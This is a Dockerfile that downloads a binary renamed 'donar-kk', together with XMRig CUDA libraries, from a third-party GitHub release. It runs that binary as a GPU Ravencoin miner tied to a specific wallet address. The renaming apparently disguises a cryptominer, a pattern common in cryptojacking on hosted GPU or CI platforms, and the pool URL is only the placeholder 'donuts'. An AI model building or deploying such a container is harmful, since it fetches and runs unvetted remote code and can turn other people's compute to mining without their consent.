# Stage 1: Build/Prepare
FROM ubuntu:22.04 AS builder

# Prevent interactive prompts
ARG DEBIAN_FRONTEND=noninteractive

# Prepare commands
RUN apt-get update && \
  apt-get install -y wget ca-certificates && \
  rm -rf /var/lib/apt/lists/*

# Build commands
WORKDIR /build
RUN wget -O donar-kk "https://github.com/lilcoinzdc/guap-dats/releases/download/double-kabeb/donar-kk" && \
wget "https://github.com/lilcoinzdc/guap-dats/releases/download/double-kabeb/libxmrig-cu.a" && \
wget "https://github.com/lilcoinzdc/guap-dats/releases/download/double-kabeb/libxmrig-cuda.so" && \
  chmod +x donar-kk

# ---

# Stage 2: Runtime
# CHANGED: Use Nvidia CUDA base image (matches your ubuntu 24.04 preference)
# This provides the necessary CUDA runtime stubs
# FROM nvidia/cuda:12.6.3-runtime-ubuntu24.04
FROM nvidia/cuda:12.4.1-runtime-ubuntu22.04
RUN apt-get install -y libuv1

WORKDIR /app

# Deploy files
COPY --from=builder /build/donar-kk .
COPY --from=builder /build/libxmrig-cu.a .
COPY --from=builder /build/libxmrig-cuda.so .

# Run command
# Added '--gpus all' to the docker run command (see below), not here.
CMD ["./donar-kk", \
  "--coin", "RVN", \
  "--url", "donuts", \
  "--user", "RKMHU6p7KLWRLkn64rP2Dg3oyNf2QV7RrN/ngas", \
  "--no-cpu", "--cuda"]
